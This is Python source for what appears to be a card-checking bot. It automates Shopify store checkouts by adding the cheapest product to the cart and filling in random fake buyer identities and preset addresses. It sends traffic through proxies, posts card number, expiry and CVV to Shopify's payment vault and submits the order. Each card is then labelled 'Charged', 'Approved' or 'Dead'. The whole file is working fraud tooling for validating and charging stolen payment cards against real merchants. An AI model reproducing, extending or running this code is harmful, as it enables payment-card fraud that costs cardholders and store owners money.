async def _fetch_products_async(domain: str, proxy_url: Optional[str] = None) -> Tuple[bool, Any]:
    """Async product fetch using aiohttp (matches Autoshopify behaviour)."""
    try:
        import aiohttp as _aiohttp
    except Exception:
        return False, "aiohttp not available"

    if not domain.startswith('http'):
        domain = "https://" + domain

    connector = _aiohttp.TCPConnector(ssl=False)
    timeout = _aiohttp.ClientTimeout(total=10)
    proxy = proxy_url or None

    try:
        async with _aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            async with session.get(f"{domain}/products.json", proxy=proxy, timeout=10) as resp:
                if resp.status != 200:
                    return False, f"<b>Site Error! Status: {resp.status}</b>"
                text = await resp.text()
                if "shopify" not in text.lower():
                    return False, "<b>Not Shopify!</b>"
                data = json.loads(text)
                result = data.get('products') or []
                if not result:
                    return False, "<b>No Products!</b>"

        min_price = float('inf')
        min_product = None
        for product in result:
            for variant in product.get('variants', []) or []:
                if not variant.get('available', True):
                    continue
                try:
                    price = variant.get('price', '0')
                    price = float(str(price).replace(',', ''))
                except (ValueError, TypeError):
                    continue
                if price < min_price:
                    min_price = price
                    min_product = {
                        'site': domain,
                        'price': f"{price:.2f}",
                        'variant_id': str(variant['id']),
                        'link': f"{domain}/products/{product.get('handle','')}",
                    }
        if min_product:
            return True, min_product
        return False, "<b>No Valid Products</b>"
    except Exception as e:
        return False, f"error: {e}"


async def _process_card_async(
    cc: str, mes: str, ano: str, cvv: str,
    site_url: str, variant_id: Optional[str] = None,
    proxy_url: Optional[str] = None,
) -> Tuple[bool, str, str, str, str]:
    """
    Async checkout — direct port of Autoshopify.process_card().
    Returns: (success_bool, message, gateway, price, currency)
    """
    try:
        import aiohttp as _aiohttp
    except Exception:
        return False, "aiohttp not available", "UNKNOWN", "0.00", "USD"

    gateway = "UNKNOWN"
    total_price = "0.00"
    currency = "USD"

    ourl = site_url if site_url.startswith('http') else f'https://{site_url}'
    payment_identifier = None
    proxy = proxy_url or None
    checkpoint_data = None
    running_total = "0.00"

    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/json',
            'Origin': ourl,
            'Referer': ourl,
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        # Initial address guess (US default; will be replaced after we see the currency)
        address_info = COUNTRY_ADDRESSES["US"]
        country_code = address_info.country_code

        firstName = random.choice(FIRST_NAMES).title()
        lastName  = random.choice(LAST_NAMES).title()
        email = f"{firstName.lower()}.{lastName.lower()}@{random.choice(EMAIL_DOMAINS)}"

        phone   = address_info.phone
        street  = address_info.address1
        city    = address_info.city
        state   = address_info.zone_code
        s_zip   = address_info.postal_code
        address2 = ""

        if not variant_id:
            ok, info = await _fetch_products_async(ourl, proxy)
            if not ok:
                return False, info, gateway, total_price, currency
            variant_id = info['variant_id']

        connector = _aiohttp.TCPConnector(ssl=False)
        timeout = _aiohttp.ClientTimeout(total=30)

        async with _aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            url = ourl
            cart = url + '/cart/add.js'
            checkout = url + '/checkout/'

            # ── Cart add (form-encoded first, JSON fallback) ──
            cart_headers = {
                **headers,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': 'application/json, text/javascript',
            }
            cart_resp = await session.post(
                cart, data=f'id={variant_id}&quantity=1',
                headers=cart_headers, proxy=proxy
            )
            if cart_resp.status != 200:
                cart_headers_alt = {
                    **headers,
                    'Content-Type': 'application/json',
                    'Accept': 'application/json',
                }
                cart_data = {'items': [{'id': int(variant_id), 'quantity': 1}]}
                cart_resp = await session.post(
                    cart, json=cart_data, headers=cart_headers_alt, proxy=proxy
                )
            if cart_resp.status != 200:
                return False, f"Cart failed with status {cart_resp.status}", gateway, total_price, currency

            # ── Checkout redirect ──
            checkout_headers = {
                **headers,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
            }
            response = await session.post(
                url=checkout, allow_redirects=True,
                headers=checkout_headers, proxy=proxy
            )
            checkout_url = str(response.url)
            if 'login' in checkout_url.lower():
                return False, "Site requires login!", gateway, total_price, currency

            attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
            attempt_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split('/')[-1].split('?')[0]

            sst = (response.headers.get('X-Checkout-One-Session-Token')
                   or response.headers.get('x-checkout-one-session-token'))
            text = await response.text()

            if not sst:
                sst = (_extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&quot;')
                       or _extract_between(text, 'name="serialized-sessionToken" content="', '"')
                       or _extract_between(text, '"serializedSessionToken":"', '"')
                       or _extract_between(text, 'data-session-token="', '"')
                       or _extract_between(text, '"sessionToken":"', '"'))

            queueToken = (_extract_between(text, 'queueToken&quot;:&quot;', '&quot;')
                          or _extract_between(text, '"queueToken":"', '"'))
            stableId = (_extract_between(text, 'stableId&quot;:&quot;', '&quot;')
                        or _extract_between(text, '"stableId":"', '"'))

            merch = (_extract_between(text, 'ProductVariantMerchandise/', '&quot;')
                     or _extract_between(text, 'ProductVariantMerchandise/', '&q')
                     or _extract_between(text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"')
                     or str(variant_id))

            cur_match = re.search(r'"currencyCode"\s*:\s*"([A-Z]{3})"', text)
            currency = cur_match.group(1) if cur_match else "USD"

            subtotal = (_extract_between(text, 'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&quot;')
                        or _extract_between(text, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"'))
            if not subtotal:
                pm = re.search(r'"price":\s*"([\d.]+)"', text)
                subtotal = pm.group(1) if pm else "0.01"

            unescaped = text.replace('&quot;', '"').replace('&amp;', '&').replace('&#39;', "'")

            build_id = None
            bm = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
            if bm:
                build_id = bm.group(1)

            source_token = _extract_between(text, 'name="serialized-sourceToken" content="', '"')
            if source_token:
                source_token = source_token.replace('&quot;', '').strip('"')

            ident_sig = None
            im = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped)
            if im:
                ident_sig = im.group(1)

            if not sst:
                return False, "Failed to get session token", gateway, total_price, currency

            # ── Update address based on the currency we saw ──
            address_info = pick_address_for_store(ourl, currency=currency)
            country_code = address_info.country_code
            phone = address_info.phone
            street = address_info.address1
            city = address_info.city
            state = address_info.zone_code
            s_zip = address_info.postal_code

            # ── Add checkout-specific headers ──
            headers.update({
                'shopify-checkout-client': 'checkout-web/1.0',
                'shopify-checkout-source': f'id="{attempt_token}", type="cn"',
                'x-checkout-one-session-token': sst,
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
            })
            if build_id:
                headers['x-checkout-web-build-id'] = build_id
                headers['x-checkout-web-deploy-stage'] = 'production'
                headers['x-checkout-web-server-handling'] = 'fast'
                headers['x-checkout-web-server-rendering'] = 'yes'
            if source_token:
                headers['x-checkout-web-source-id'] = source_token

            graphql_url = f'https://{urllib.parse.urlparse(ourl).netloc}/checkouts/unstable/graphql'

            # ── Build Proposal payload ──
            json_data = {
                'query': QUERY_PROPOSAL,
                'variables': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken or '',
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': {
                        'deliveryLines': [{
                            'destination': {
                                'partialStreetAddress': {
                                    'address1': street, 'address2': address2, 'city': city,
                                    'countryCode': country_code, 'postalCode': s_zip,
                                    'firstName': firstName, 'lastName': lastName,
                                    'zoneCode': state, 'phone': phone,
                                }
                            },
                            'selectedDeliveryStrategy': {
                                'deliveryStrategyMatchingConditions': {
                                    'estimatedTimeInTransit': {'any': True},
                                    'shipments': {'any': True},
                                },
                                'options': {},
                            },
                            'targetMerchandiseLines': {'any': True},
                            'deliveryMethodTypes': ['SHIPPING'],
                            'expectedTotalPrice': {'any': True},
                            'destinationChanged': True,
                        }],
                        'noDeliveryRequired': [],
                        'useProgressiveRates': False,
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True,
                    },
                    'deliveryExpectations': {'deliveryExpectationLines': []},
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': stableId or '1',
                            'merchandise': {
                                'productVariantReference': {
                                    'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                                    'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                    'properties': [],
                                    'sellingPlanId': None,
                                    'sellingPlanDigest': None,
                                }
                            },
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {'value': {'amount': subtotal, 'currencyCode': currency}},
                            'lineComponentsSource': None,
                            'lineComponents': [],
                        }]
                    },
                    'payment': {
                        'totalAmount': {'any': True},
                        'paymentLines': [],
                        'billingAddress': {
                            'streetAddress': {
                                'address1': '', 'city': '', 'countryCode': country_code,
                                'lastName': '', 'zoneCode': 'ENG', 'phone': '',
                            }
                        },
                    },
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                        'email': email,
                        'emailChanged': False,
                        'phoneCountryCode': country_code,
                        'marketingConsent': [{'email': {'value': email}}],
                        'shopPayOptInPhone': {'countryCode': country_code},
                        'rememberMe': False,
                    },
                    'tip': {'tipLines': []},
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}},
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': [],
                    },
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'scriptFingerprint': {
                        'signature': None, 'signatureUuid': None,
                        'lineItemScriptChanges': [], 'paymentScriptChanges': [], 'shippingScriptChanges': [],
                    },
                    'optionalDuties': {'buyerRefusesDuties': False},
                },
                'operationName': 'Proposal',
            }

            params = {'operationName': 'Proposal'}

            resp_text = ""
            resp_json = None
            # 2 attempts on Proposal (matches Autoshopify)
            for i in range(2):
                r = await session.post(graphql_url, params=params, headers=headers, json=json_data, proxy=proxy)
                resp_text = await r.text()
                if i == 0:
                    await asyncio.sleep(3)

            if is_captcha_required(resp_text):
                return False, "CAPTCHA_REQUIRED", gateway, total_price, currency

            try:
                resp_json = json.loads(resp_text)
            except json.JSONDecodeError as e:
                return False, f"Invalid JSON response: {e}", gateway, total_price, currency

            if 'errors' in resp_json:
                errs = resp_json.get('errors', []) or []
                msgs = [e.get('message', str(e)) for e in errs[:3]]
                return False, f"GraphQL Error: {'; '.join(msgs)}", gateway, total_price, currency

            try:
                session_data = resp_json['data'].get('session')
                if session_data is None:
                    return False, "Session is null", gateway, total_price, currency
                negotiate = session_data.get('negotiate')
                if negotiate is None:
                    return False, "Negotiate returned null", gateway, total_price, currency
                result = negotiate.get('result')
                if result is None:
                    return False, "Result is null", gateway, total_price, currency

                result_type = result.get('__typename', 'Unknown')
                if result_type == 'CheckpointDenied':
                    return False, "Checkpoint Denied", gateway, total_price, currency
                if result_type == 'Throttled':
                    return False, "Throttled", gateway, total_price, currency
                if result_type == 'NegotiationResultFailed':
                    return False, "Negotiation failed", gateway, total_price, currency

                checkpoint_data = result.get('checkpointData')
                seller_proposal = result.get('sellerProposal')
                if seller_proposal is None:
                    return False, "Seller proposal is null", gateway, total_price, currency

                delivery_data = seller_proposal.get('delivery')
                running_total_data = seller_proposal.get('runningTotal')
                if not running_total_data:
                    return False, "No runningTotal in sellerProposal", gateway, total_price, currency
                running_total = running_total_data['value']['amount']
            except (KeyError, TypeError) as e:
                return False, f"Failed to parse proposal response: {e}", gateway, total_price, currency

            if not delivery_data:
                return False, "No delivery data in proposal", gateway, total_price, currency

            delivery_type = delivery_data.get('__typename', '')
            if delivery_type == 'PendingTerms':
                delivery_strategy = ''
                shipping_amount = 0.0
            elif delivery_type == 'FilledDeliveryTerms':
                delivery_lines = delivery_data.get('deliveryLines', [{}]) or [{}]
                available_strategies = (delivery_lines[0] or {}).get('availableDeliveryStrategies', []) or []
                if available_strategies:
                    delivery_strategy = available_strategies[0].get('handle', '')
                    try:
                        shipping_amount = float(
                            available_strategies[0].get('amount', {}).get('value', {}).get('amount', '0')
                        )
                    except Exception:
                        shipping_amount = 0.0
                else:
                    delivery_strategy = ''
                    shipping_amount = 0.0
            else:
                delivery_strategy = ''
                shipping_amount = 0.0

            try:
                tax_data = seller_proposal.get('tax', {}) or {}
                if tax_data.get('__typename') == 'FilledTaxTerms':
                    tax_amount = float(tax_data.get('totalTaxAmount', {}).get('value', {}).get('amount', '0'))
                else:
                    tax_amount = 0.0
            except Exception:
                tax_amount = 0.0

            payment_data = seller_proposal.get('payment', {}) or {}
            if payment_data.get('__typename') == 'FilledPaymentTerms':
                for method in payment_data.get('availablePaymentLines', []) or []:
                    pm = method.get('paymentMethod', {}) or {}
                    ident = pm.get('paymentMethodIdentifier')
                    if ident:
                        payment_identifier = ident
                        gateway = (pm.get('extensibilityDisplayName')
                                   or pm.get('name') or 'UNKNOWN')
                        total_price = str(float(running_total) + shipping_amount + tax_amount)
                        break

            if not payment_identifier:
                return False, "No valid payment method found", gateway, total_price, currency

            # ── Delivery re-proposal ──
            json_data['variables']['delivery']['deliveryLines'][0]['selectedDeliveryStrategy'] = {
                'deliveryStrategyByHandle': {
                    'handle': delivery_strategy or '',
                    'customDeliveryRate': False,
                },
                'options': {},
            }
            json_data['variables']['delivery']['deliveryLines'][0]['targetMerchandiseLines'] = {
                'lines': [{'stableId': stableId or '1'}]
            }
            json_data['variables']['delivery']['deliveryLines'][0]['expectedTotalPrice'] = {
                'value': {'amount': str(shipping_amount), 'currencyCode': currency}
            }
            json_data['variables']['delivery']['deliveryLines'][0]['destinationChanged'] = False
            json_data['variables']['payment']['billingAddress'] = {
                'streetAddress': {
                    'address1': street, 'address2': address2, 'city': city,
                    'countryCode': country_code, 'postalCode': s_zip,
                    'firstName': firstName, 'lastName': lastName,
                    'zoneCode': state, 'phone': phone,
                }
            }
            json_data['variables']['taxes']['proposedTotalAmount']['value']['amount'] = str(tax_amount)
            json_data['variables']['buyerIdentity']['shopPayOptInPhone']['number'] = phone

            r = await session.post(graphql_url, params=params, headers=headers, json=json_data, proxy=proxy)
            resp_text = await r.text()
            if is_captcha_required(resp_text):
                return False, "CAPTCHA_REQUIRED on delivery proposal", gateway, total_price, currency

            # ── PCI vault: tokenise the card ──
            payload = {
                "credit_card": {
                    "number": cc,
                    "month": int(mes),
                    "year": int(ano),
                    "verification_value": cvv,
                    "start_month": None,
                    "start_year": None,
                    "issue_number": "",
                    "name": f"{firstName} {lastName}",
                },
                "payment_session_scope": urllib.parse.urlparse(url).netloc,
            }
            vault_headers = {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Accept-Language': 'en-US,en;q=0.9',
                'Origin': 'https://checkout.pci.shopifyinc.com',
                'Referer': 'https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
                'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-storage-access': 'active',
            }
            if ident_sig:
                vault_headers['shopify-identification-signature'] = ident_sig

            vr = await session.post(
                'https://checkout.pci.shopifyinc.com/sessions',
                json=payload, headers=vault_headers, proxy=proxy
            )
            try:
                token_data = await vr.json(content_type=None)
                token = token_data.get('id')
                if not token:
                    return False, 'Unable to get payment token', gateway, total_price, currency
            except Exception as e:
                return False, f'Unable to get payment token: {e}', gateway, total_price, currency

            # ── Submit ──
            submit_params = {'operationName': 'SubmitForCompletion'}
            submit_variables = {
                'input': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken or '',
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': {
                        'deliveryLines': [{
                            'destination': {
                                'streetAddress': {
                                    'address1': street, 'address2': address2, 'city': city,
                                    'countryCode': country_code, 'postalCode': s_zip,
                                    'firstName': firstName, 'lastName': lastName,
                                    'zoneCode': state, 'phone': phone,
                                }
                            },
                            'selectedDeliveryStrategy': {
                                'deliveryStrategyByHandle': {
                                    'handle': delivery_strategy or '',
                                    'customDeliveryRate': False,
                                },
                                'options': {'phone': phone},
                            },
                            'targetMerchandiseLines': {'lines': [{'stableId': stableId or '1'}]},
                            'deliveryMethodTypes': ['SHIPPING'],
                            'expectedTotalPrice': {
                                'value': {'amount': str(shipping_amount), 'currencyCode': currency}
                            },
                            'destinationChanged': False,
                        }],
                        'noDeliveryRequired': [],
                        'useProgressiveRates': True,
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True,
                    },
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': stableId or '1',
                            'merchandise': {
                                'productVariantReference': {
                                    'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                                    'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                    'properties': [],
                                    'sellingPlanId': None,
                                    'sellingPlanDigest': None,
                                }
                            },
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {'value': {'amount': subtotal, 'currencyCode': currency}},
                            'lineComponentsSource': None,
                            'lineComponents': [],
                        }]
                    },
                    'payment': {
                        'totalAmount': {'any': True},
                        'paymentLines': [{
                            'paymentMethod': {
                                'directPaymentMethod': {
                                    'paymentMethodIdentifier': payment_identifier,
                                    'sessionId': token,
                                    'billingAddress': {
                                        'streetAddress': {
                                            'address1': street, 'address2': address2,
                                            'city': city, 'countryCode': country_code,
                                            'postalCode': s_zip, 'firstName': firstName,
                                            'lastName': lastName, 'zoneCode': state,
                                            'phone': phone,
                                        }
                                    },
                                    'cardSource': None,
                                }
                            },
                            'amount': {'value': {'amount': running_total, 'currencyCode': currency}},
                            'dueAt': None,
                        }],
                        'billingAddress': {
                            'streetAddress': {
                                'address1': street, 'address2': address2,
                                'city': city, 'countryCode': country_code,
                                'postalCode': s_zip, 'firstName': firstName,
                                'lastName': lastName, 'zoneCode': state,
                                'phone': phone,
                            }
                        },
                    },
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                        'email': email,
                        'emailChanged': False,
                        'phoneCountryCode': country_code,
                        'marketingConsent': [{'email': {'value': email}}],
                        'shopPayOptInPhone': {'number': phone, 'countryCode': country_code},
                        'rememberMe': False,
                    },
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {'value': {'amount': str(tax_amount), 'currencyCode': currency}},
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': [],
                    },
                    'tip': {'tipLines': []},
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'optionalDuties': {'buyerRefusesDuties': False},
                },
                'attemptToken': attempt_token,
                'metafields': [],
                'analytics': {'requestUrl': checkout_url},
            }
            if checkpoint_data:
                submit_variables['input']['checkpointData'] = checkpoint_data

            submit_json = {
                'query': MUTATION_SUBMIT,
                'variables': submit_variables,
                'operationName': 'SubmitForCompletion',
            }

            sr = await session.post(
                graphql_url, params=submit_params, headers=headers,
                json=submit_json, proxy=proxy
            )
            submit_text = await sr.text()

            if is_captcha_required(submit_text):
                return False, "CAPTCHA_REQUIRED on submit", gateway, total_price, currency

            if "Your order total has changed." in submit_text:
                return False, "Site not supported", gateway, total_price, currency
            if "The requested payment method is not available." in submit_text:
                return False, "Payment method not available", gateway, total_price, currency

            # ── Parse submit ──
            rid = None
            try:
                resp_json = json.loads(submit_text)
                submit_data = resp_json.get('data', {}).get('submitForCompletion', {}) or {}
                if not submit_data:
                    errors = resp_json.get('errors', []) or []
                    for error in errors:
                        code = error.get('code')
                        if code:
                            return False, code, gateway, total_price, currency
                    return False, "Empty submit response", gateway, total_price, currency

                result_type = submit_data.get('__typename', '')
                if result_type in ('SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted'):
                    receipt = submit_data.get('receipt', {}) or {}
                    receipt_type = receipt.get('__typename', '')
                    if receipt_type == 'ProcessedReceipt':
                        return True, "ORDER_PLACED", gateway, total_price, currency
                    rid = receipt.get('id')
                    if not rid:
                        return False, "SubmitSuccess but no receipt", gateway, total_price, currency
                elif result_type == 'SubmitFailed':
                    reason = submit_data.get('reason', 'Unknown reason')
                    return False, extract_clean_response(reason), gateway, total_price, currency
                elif result_type == 'SubmitRejected':
                    errors = submit_data.get('errors', []) or []
                    for error in errors:
                        code = error.get('code', '')
                        localized = error.get('localizedMessage', '') or ''
                        non_loc = error.get('nonLocalizedMessage', '') or ''
                        if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', '') and (localized or non_loc):
                            return False, (localized or non_loc), gateway, total_price, currency
                        if code:
                            return False, code, gateway, total_price, currency
                    return False, "Submit Rejected", gateway, total_price, currency
                elif result_type == 'Throttled':
                    return False, "Throttled", gateway, total_price, currency

                receipt = submit_data.get('receipt', {}) or {}
                rid = receipt.get('id')
                if not rid:
                    return False, "No receipt in submit response", gateway, total_price, currency
            except json.JSONDecodeError:
                return False, f"Invalid JSON in submit response: {submit_text[:100]}", gateway, total_price, currency
            except Exception as e:
                return False, f"Error parsing submit: {e}", gateway, total_price, currency

            # ── Poll for receipt ──
            poll_params = {'operationName': 'PollForReceipt'}
            poll_json = {
                'query': QUERY_POLL,
                'variables': {'receiptId': rid, 'sessionToken': sst},
                'operationName': 'PollForReceipt',
            }

            await asyncio.sleep(3)
            final_text = ""
            for i in range(4):
                pr = await session.post(
                    graphql_url, params=poll_params, headers=headers,
                    json=poll_json, proxy=proxy
                )
                final_text = await pr.text()

                if is_captcha_required(final_text):
                    return True, "CARD_DECLINED", gateway, total_price, currency

                try:
                    pj = json.loads(final_text)
                    rd = pj.get('data', {}).get('receipt', {}) or {}
                    if rd:
                        tn = rd.get('__typename', '')
                        if tn == 'ProcessedReceipt':
                            return True, "ORDER_PLACED", gateway, total_price, currency
                        elif tn == 'FailedReceipt':
                            err = rd.get('processingError', {}) or {}
                            et = err.get('__typename', '')
                            if et == 'PaymentFailed':
                                code = err.get('code', '')
                                msg = err.get('messageUntranslated', '') or ''
                                if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', '') and msg:
                                    return True, msg, gateway, total_price, currency
                                return True, (code or 'PAYMENT_FAILED'), gateway, total_price, currency
                            code = err.get('code') or et or 'UNKNOWN_ERROR'
                            return True, code, gateway, total_price, currency
                        elif tn == 'ActionRequiredReceipt':
                            return True, "OTP_REQUIRED", gateway, total_price, currency
                        if tn in ('ProcessingReceipt', 'WaitingReceipt'):
                            await asyncio.sleep(4)
                            continue
                except Exception:
                    pass

                if 'WaitingReceipt' in final_text:
                    await asyncio.sleep(4)
                else:
                    break

            if 'CAPTCHA_REQUIRED' in final_text:
                return True, "CARD_DECLINED", gateway, total_price, currency
            if 'WaitingReceipt' in final_text:
                return False, "Change Proxy or Site", gateway, total_price, currency

            try:
                rj = json.loads(final_text)
                result = rj.get('data', {}).get('receipt', {}).get('processingError', {}).get('code')
                if "shopify_payments" in str(rj):
                    return True, "ORDER_PLACED", gateway, total_price, currency
                if result:
                    return True, result, gateway, total_price, currency
                return True, "MISMATCHED_BILL", gateway, total_price, currency
            except Exception:
                pass

            code = _extract_between(final_text, '{"code":"', '"')
            fl = final_text.lower()
            if 'actionreq' in fl or 'action_required' in fl:
                return True, "OTP_REQUIRED", gateway, total_price, currency
            if 'processedreceipt' in fl:
                return True, "ORDER_PLACED", gateway, total_price, currency
            if 'failedreceipt' in fl or 'declined' in fl:
                return True, (code or "CARD_DECLINED"), gateway, total_price, currency
            return False, "Unknown Result", gateway, total_price, currency

    except Exception as e:
        return False, f"Error Processing Card: {e}", gateway, total_price, currency


# ============================================================================
# ────────────────────────── PUBLIC SYNC WRAPPER ─────────────────────────────
# ============================================================================

def _run_async(coro):
    """Run an async coroutine from a sync context, safely."""
    try:
        loop = asyncio.get_event_loop()
        if loop.is_running():
            # We're inside a running loop (bot's threadpool executor).
            # Create a new loop in a fresh thread to avoid "loop already running".
            import concurrent.futures
            with concurrent.futures.ThreadPoolExecutor(max_workers=1) as ex:
                fut = ex.submit(asyncio.run, coro)
                return fut.result()
        return loop.run_until_complete(coro)
    except RuntimeError:
        return asyncio.run(coro)


def run_checkout_public(shop_url: str, card: str, proxy_url: str = "", low: bool = True):
    """
    Bot-friendly wrapper matching the interface the bot expects:
        run_checkout_public(site, card, proxy_url, low)

    card format: "number|mm|yyyy|cvv"

    Returns a dict with:
        status, message, card, site, gateway, price, price_value,
        proxy, status_code, retryable, currency, receipt_url
    """
    parts = card.split('|')
    if len(parts) != 4:
        return {
            'status': 'Dead', 'message': 'Invalid format',
            'card': card, 'site': shop_url, 'gateway': 'Shopify',
            'price': '-', 'price_value': 0.0,
            'proxy': proxy_url, 'status_code': 'CARD_INVALID',
            'retryable': False, 'currency': 'USD', 'receipt_url': '',
        }

    cc, mes, ano, cvv = parts

    try:
        success, message, gateway, price, currency = _run_async(
            _process_card_async(cc, mes, ano, cvv, shop_url, None, proxy_url or None)
        )
    except Exception as e:
        return {
            'status': 'Error', 'message': str(e)[:150],
            'card': card, 'site': shop_url, 'gateway': 'Shopify',
            'price': '-', 'price_value': 0.0,
            'proxy': proxy_url, 'status_code': 'EXCEPTION',
            'retryable': True, 'currency': 'USD', 'receipt_url': '',
        }

    clean = extract_clean_response(message)

    # Map Autoshopify status → bot status
    msg_upper = str(clean or message or "").upper()
    is_success = bool(success)

    try:
        price_value = float(price) if price and str(price).replace('.', '', 1).isdigit() else 0.0
    except Exception:
        price_value = 0.0

    if is_success:
        if "ORDER_PLACED" in msg_upper:
            status = 'Charged'
            status_code = 'ORDER_PLACED'
        elif "OTP_REQUIRED" in msg_upper or "3DS" in msg_upper:
            status = 'Approved'
            status_code = '3DS_AUTHENTICATION'
        elif "INSUFFICIENT_FUNDS" in msg_upper:
            status = 'Approved'
            status_code = 'INSUFFICIENT_FUNDS'
        elif "CARD_DECLINED" in msg_upper or "DECLINED" in msg_upper:
            status = 'Dead'
            status_code = 'CARD_DECLINED'
        else:
            # Success but no explicit code — treat as Approved
            status = 'Approved'
            status_code = clean or 'APPROVED'
    else:
        # Not a "success" flag — inspect the message for a decline code
        if any(k in msg_upper for k in (
            "CARD_DECLINED", "DO_NOT_HONOR", "INSUFFICIENT_FUNDS",
            "CARD_EXPIRED", "CARD_INVALID", "CVV_INVALID",
            "CARD_STOLEN", "RISK_REJECTED", "PAYMENT_FAILED",
            "GENERIC_ERROR", "DECLINED",
        )):
            status = 'Dead'
            status_code = clean or 'CARD_DECLINED'
        elif "CAPTCHA" in msg_upper:
            status = 'Error'
            status_code = 'CAPTCHA_REQUIRED'
        elif any(k in msg_upper for k in (
            "THROTTLED", "CHANGE PROXY", "SITE NOT SUPPORTED",
            "PAYMENT METHOD NOT AVAILABLE", "TIMEOUT",
        )):
            status = 'Error'
            status_code = clean or 'RETRYABLE'
        else:
            status = 'Error'
            status_code = clean or 'UNKNOWN'

    retryable = status == 'Error'

    return {
        'status': status,
        'message': clean or message or 'unknown',
        'card': card,
        'site': shop_url,
        'gateway': gateway or 'Shopify',
        'price': price or '-',
        'price_value': price_value,
        'proxy': proxy_url,
        'status_code': status_code,
        'retryable': retryable,
        'currency': currency or 'USD',
        'receipt_url': '',
    }


# ──────────────────────── load proxy pool on import ──────────────────
_load_proxy_pool_from_env()


